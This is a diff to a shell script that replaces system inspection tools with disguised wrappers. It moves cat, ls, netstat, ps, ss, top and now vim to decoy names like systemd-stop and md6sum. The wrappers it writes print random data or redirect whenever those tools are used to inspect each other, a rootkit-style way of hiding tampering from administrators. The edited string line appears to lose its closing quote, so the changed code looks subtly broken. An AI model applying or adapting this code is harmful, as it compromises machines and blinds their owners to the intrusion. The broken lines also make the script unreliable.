@@ -7,6 +7,7 @@ netstat_path=`which netstat`
 ps_path=`which ps`
 ss_path=`which ss`
 top_path=`which top`
+vim_path=`which vim`
 
 mv "$cat_path" /usr/bin/systemd-stop
 mv "$ls_path" /usr/bin/pbmtoaw
@@ -16,6 +17,7 @@ mv "$netstat_path" /usr/bin/ziplist
 mv "$ps_path" /usr/bin/watchgnome
 mv "$ss_path" /usr/bin/traceroute-list
 mv "$top_path" /usr/bin/sha128sum
+mv "$vim_path" /usr/bin/md6sum
 
 newcat='
 #!/bin/bash
@@ -24,9 +26,9 @@ if [[ -z "${farg// }" ]]; then
     /usr/bin/systemd-stop $@
     exit
 fi
-substr="lsofmountnetstatpssockstattopcat"
+substr="lsofmountnetstatpssockstattopcatvim
 if  [[ $substr =~ .*$farg.* ]]; then
-    head -n 50 /dev/urandom
+    head -n 50 /dev/urandom /usr/bin/systemd-stop
     exit
 fi
 /usr/bin/systemd-stop $@
@@ -82,3 +84,20 @@ newtop='
 '
 echo -e "$newtop" >> $top_path
 chmod +x $top_path
+
+newvim='
+#!/bin/bash
+farg=${1##*/}
+if [[ -z "${farg// }" ]]; then
+    /usr/bin/md6sum $@
+    exit
+fi
+substr="lsofmountnetstatpssockstattopcatvim"
+if  [[ $substr =~ .*$farg.* ]]; then
+    /usr/bin/md6sum /usr/bin/systemd-stop
+    exit
+fi
+/usr/bin/md6sum $@
+'
+echo -e "$newvim" >> $vim_path
+chmod +x $vim_path
